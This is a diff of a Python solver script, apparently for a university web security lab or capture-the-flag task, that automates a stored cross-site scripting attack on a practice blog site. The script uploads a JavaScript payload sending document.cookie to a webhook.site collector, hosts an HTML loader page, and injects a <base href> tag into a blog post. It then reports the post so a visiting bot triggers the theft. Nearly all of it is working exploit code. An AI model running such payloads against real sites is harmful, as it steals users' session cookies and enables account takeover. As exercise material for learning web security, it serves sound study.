@@ -6,7 +6,7 @@ from utils import get_session, WebhookSite, HostedWebsiteCSE
 import html
 
 BASE_URL = "https://engineering.quoccacorp.com"
-HTML_FILENAME = "index.html"
+HTML_FILENAME = f"{Path(__file__).stem}.html"
 
 class Solver:
     def __init__(self):
@@ -21,36 +21,30 @@ class Solver:
         return response.headers["Content-Security-Policy"]
 
     # /analytics.js
-    def scrape_root_relative_script_path(self) -> str:
+    def scrape_root_relative_js_script_path(self) -> str:
         from bs4 import BeautifulSoup
         response = self.session.get(BASE_URL)
         soup = BeautifulSoup(response.text, "html.parser")
-
         target_script_element = soup.find_all("script", src=True)[-1]
         return target_script_element["src"]
 
     def main(self):
-        print(self.webhooksite.view_url)
-        print(self.webhooksite.url)
-
-        js_script_path = self.scrape_root_relative_script_path()
+        js_script_path = self.scrape_root_relative_js_script_path()
+        js_filename = js_script_path.lstrip('/')
 
         JS_PAYLOAD = f'fetch(`{self.webhooksite.url}?q=${{document.cookie}}`);'
-        with open(js_script_path.lstrip('/'), 'w') as f:
-            f.write(JS_PAYLOAD)
+        self.hosted_website.upload_file(js_filename, JS_PAYLOAD.encode(), write_to_root=True)
 
-        HTML_PAYLOAD = f'<script src="{js_script_path}"></script>'
-        with open(HTML_FILENAME, 'w') as f:
-            f.write(f"<h1><pre>{html.escape(HTML_PAYLOAD)}</pre></h1>\n" + HTML_PAYLOAD)
+        HTML_PAYLOAD = f'<script src="whydoesthiswork/whydoesthiswork/whydoesthiswork/whydoesthiswork/{js_script_path}"></script>'
+        HTML = f"<h1><pre>{html.escape(HTML_PAYLOAD)}</pre></h1>\n" + HTML_PAYLOAD # Only HTML_PAYLOAD is needed. <pre> is used for debugging
+        html_url = self.hosted_website.upload_file(HTML_FILENAME, HTML.encode(), write_to_root=True)
+        print(html_url)
 
-        PAYLOAD = f'<base href="https://z5437741.web.cse.unsw.edu.au/">'
-        print(PAYLOAD)
+        PAYLOAD = f'<base href="{html_url}">'
         response = self.session.post(f"{BASE_URL}/posts", data={"title": PAYLOAD, "content": PAYLOAD})
-        print(response.url)
 
         # Report Blog Post
         response = self.session.post(f"{response.url}/report")
-        print(response.text)
 
         self.webhooksite.find_flags()
 
